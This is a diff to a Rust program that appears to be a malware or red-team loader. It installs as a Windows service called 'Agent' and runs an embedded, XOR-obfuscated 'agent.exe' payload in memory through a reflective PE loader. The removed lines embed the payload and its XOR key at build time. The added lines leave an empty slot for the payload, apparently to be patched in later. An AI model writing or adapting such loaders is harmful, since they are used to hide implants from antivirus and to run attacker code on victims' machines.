@@ -11,12 +11,9 @@ use windows_service::{
 #[cfg(feature = "windows-service")]
 define_windows_service!(ffi_service_main, service_main);
 
-#[link_section = "bin"]
+#[link_section = ".bin"]
 #[used]
-static mut AGENT_BIN: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/agent.exe")); // Reference stored in .bin, data stored in .rdata
-// static mut AGENT_BIN: &[u8] = &[];
-
-const XOR_KEY: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/xor_key"));
+static mut AGENT: &[u8] = &[];
 
 #[cfg(feature = "windows-service")]
 const SERVICE_NAME: &str = "Agent";
@@ -54,18 +51,16 @@ fn service_main(_arguments: Vec<std::ffi::OsString>) {
     unsafe { load() }
 }
 
-#[allow(static_mut_refs)]
 unsafe fn load() {
-    rspe::reflective_loader(common::unpack_to_vec(AGENT_BIN, XOR_KEY));
+    let _ = rspe::reflective_loader(&common::unpack_to_vec(AGENT));
 }
 
 // TODO Fix bug: two processes are created instead of one
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() {
     #[cfg(feature = "windows-service")]
-    windows_service::service_dispatcher::start(SERVICE_NAME, ffi_service_main)?;
+    let _ = windows_service::service_dispatcher::start(SERVICE_NAME, ffi_service_main);
     #[cfg(not(feature = "windows-service"))]
     unsafe {
         load();
     }
-    Ok(())
 }
